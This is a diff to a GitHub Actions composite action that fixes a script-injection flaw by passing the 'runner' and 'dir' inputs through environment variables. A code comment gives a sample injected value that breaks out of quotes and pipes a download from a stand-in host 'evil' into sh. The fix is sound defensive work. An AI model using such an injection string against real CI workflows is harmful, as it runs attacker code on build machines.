@@ -49,9 +49,16 @@ runs:
     - name: Run speclock check
       shell: bash
       working-directory: ${{ inputs.working-directory }}
+      # Untrusted inputs are passed through the environment and referenced as
+      # shell variables — never interpolated with ${{ }} directly into the run
+      # script, which would let a value like '"; curl evil | sh; "' break out of
+      # the quotes and execute (GitHub Actions expands ${{ }} as text before bash
+      # parses the line). Env values are not re-parsed by the shell.
       env:
         SPECLOCK_JSON: ${{ inputs.json }}
+        SPECLOCK_RUNNER: ${{ inputs.runner }}
+        SPECLOCK_DIR: ${{ inputs.dir }}
       run: |
-        args=(check --runner "${{ inputs.runner }}" --dir "${{ inputs.dir }}")
+        args=(check --runner "$SPECLOCK_RUNNER" --dir "$SPECLOCK_DIR")
         if [ "$SPECLOCK_JSON" = "true" ]; then args+=(--json); fi
         node "$GITHUB_ACTION_PATH/dist/cli/index.js" "${args[@]}"
